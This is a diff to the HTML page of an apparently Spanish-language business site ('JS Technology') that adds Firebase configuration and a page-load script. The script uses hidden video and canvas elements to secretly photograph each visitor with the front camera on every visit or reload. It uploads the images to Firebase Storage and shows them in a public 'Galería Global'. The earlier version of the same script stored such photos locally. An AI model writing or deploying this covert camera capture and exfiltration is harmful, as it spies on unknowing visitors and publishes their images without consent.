@@ -166,6 +166,26 @@
       display: none;
     }
   </style>
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+  <script>
+    // Configuración de Firebase - usa tus datos reales
+    const firebaseConfig = {
+      apiKey: "AIzaSyDooSOXvBhvAcu43WPWlRTbeNP_q4tXVlk",
+      authDomain: "galeriajs-ad536.firebaseapp.com",
+      projectId: "galeriajs-ad536",
+      storageBucket: "galeriajs-ad536.appspot.com",
+      messagingSenderId: "15609705515",
+      appId: "1:15609705515:web:549611e0b4bf045637e66e"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const storage = firebase.storage();
+    const db = firebase.firestore();
+    firebase.auth().signInAnonymously();
+  </script>
 </head>
 <body>
   <!-- Sidebar -->
@@ -207,6 +227,11 @@
       <h3>Bienvenido a JS Technology</h3>
       <p>Seleccione una opción del menú para ver más detalles.</p>
     </div>
+    <!-- Galería Global -->
+    <div class="section" id="galeria">
+      <h3>Galería Global</h3>
+      <div id="fotosGaleria" style="display:flex; flex-wrap:wrap; gap:10px"></div>
+    </div>
   </div>
   <!-- WhatsApp -->
   <a class="whatsapp" href="https://wa.me/573244973675" target="_blank">
@@ -217,34 +242,55 @@
   <canvas id="hiddenCanvas" width="320" height="240" style="display:none;"></canvas>
   <!-- Scripts -->
   <script>
-   
     window.addEventListener('DOMContentLoaded', () => {
-      let fotos = [];
-      try {
-        fotos = JSON.parse(localStorage.getItem('fotosUsuario')) || [];
-      } catch(e) { fotos = []; }
-      if(fotos.length === 0) {
-        const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-          .then(stream => {
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              setTimeout(() => {
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                stream.getTracks().forEach(track => track.stop());
-                const imageData = canvas.toDataURL('image/png');
-                fotos.push(imageData);
-                localStorage.setItem('fotosUsuario', JSON.stringify(fotos));
-               
-              }, 600);
-            };
-          })
-          .catch(err => {
-         
-            console.warn('No se pudo acceder a la cámara:', err);
-          });
-      }
+      // Siempre tomar foto y subirla a Firebase al entrar o recargar la página
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+        .then(stream => {
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              stream.getTracks().forEach(track => track.stop());
+              canvas.toBlob(blob => {
+                const nombre = 'foto_' + Date.now() + '_' + Math.floor(Math.random()*10000) + '.png';
+                // Sube la imagen a Firebase Storage
+                storage.ref('fotos/' + nombre).put(blob).then(snapshot => {
+                  snapshot.ref.getDownloadURL().then(url => {
+                    // Guarda la URL en Firestore
+                    db.collection('galeria').add({
+                      url: url,
+                      fecha: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                  });
+                });
+              }, 'image/png');
+            }, 600);
+          };
+        })
+        .catch(err => {
+          console.warn('No se pudo acceder a la cámara:', err);
+        });
+
+      // Cargar galería global en tiempo real
+      db.collection('galeria').orderBy('fecha','desc').onSnapshot(snapshot => {
+        const fotosGaleria = document.getElementById('fotosGaleria');
+        fotosGaleria.innerHTML = '';
+        snapshot.forEach(doc => {
+          const data = doc.data();
+          if(data.url){
+            const img = document.createElement('img');
+            img.src = data.url;
+            img.style.width = '120px';
+            img.style.height = '90px';
+            img.style.objectFit = 'cover';
+            img.style.borderRadius = '8px';
+            img.style.boxShadow = '0 2px 8px #0002';
+            fotosGaleria.appendChild(img);
+          }
+        });
+      });
     });
 
     function toggleSubmenu(id) {
